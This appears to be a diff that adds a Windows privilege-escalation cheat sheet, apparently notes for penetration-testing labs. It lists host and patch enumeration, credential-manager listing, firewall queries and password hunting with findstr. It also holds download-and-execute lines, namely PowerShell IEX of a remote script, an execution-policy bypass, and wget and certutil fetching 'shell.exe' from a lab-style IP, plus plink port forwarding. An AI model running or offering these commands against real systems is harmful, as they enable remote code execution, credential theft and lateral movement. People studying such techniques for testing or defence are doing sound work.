@@ -1,0 +1,39 @@
+* systeminfo
+* find missing patches
+    * wmic qfe
+* whoami
+* find user privileges
+  * whoami /priv
+* credential manager
+  * cmdkey /list
+
+  * software installed
+    * dir /a “C:\program Files”
+    * dir /a “C:\Program Files (x86)”
+
+* connections to other hosts
+  * netstat -ano
+
+* firewall
+  * netsh firewall show state
+  * netsh advfirewall firewall show rule name=all
+
+* transferring files
+  * Invoke-WebRequest “https://server/filename&#8221; -OutFile “C:\Windows\Temp\filename”
+  * (New-Object System.Net.WebClient).DownloadFile(“https://server/filename&#8221;, “C:\Windows\Temp\filename”)
+  * IEX(New-Object Net.WebClient).downloadString(‘http://server/script.ps1&#8217;)
+    * powershell -Exec Bypass
+    * wget http://10.10.14.2/shell.exe -Outfile shell.exe
+  * certutil -urlcache -split -f “http://10.10.14.xy/shell.exe&#8221; shell.exe
+  * curl http://server/file -o file
+
+* Find Clear Passwords
+  * findstr /si password *.txt
+  * findstr /si password *.xml
+  * findstr /si password *.ini
+  * findstr /spin “password” *.*
+  * find “password” in all files
+
+* Port Forwarding
+  * use plink.exe
+    * ssh for windows
